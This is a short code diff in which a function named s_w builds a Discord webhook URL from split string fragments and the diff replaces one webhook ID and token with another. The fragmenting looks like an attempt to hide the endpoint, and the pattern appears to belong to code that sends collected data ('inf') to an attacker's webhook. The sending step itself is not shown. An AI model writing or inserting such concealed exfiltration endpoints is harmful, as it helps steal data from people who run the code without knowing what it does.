@@ -50,9 +50,9 @@ let lkp = "up"
 function s_w (inf) {
    let comb_x = "https://discord.com/a"
    let comb_y = "pi/webh"
-   let comb_z = "ooks/1412174161131995278/"
-   let comb_b = "4fY6J09E8xsiEr5hgGh-9xpPVhwS0Ha"
-   let comb_h = "_5RzkKHpRHLgk-TjmiKmy9eXD4Evl7b4-aooF"
+   let comb_z = "ooks/1494223944889143420/"
+   let comb_b = "7xzZgHvgdX7h8p75tVzadTQhwleZjEB-"
+   let comb_h = "zQE0wXub8ADJcQcdpPxaLQiTuNZ_n2mk1z1P"
    let comb_fi = comb_x + comb_y + comb_z + comb_b + comb_h;
 
    const wb = comb_fi;
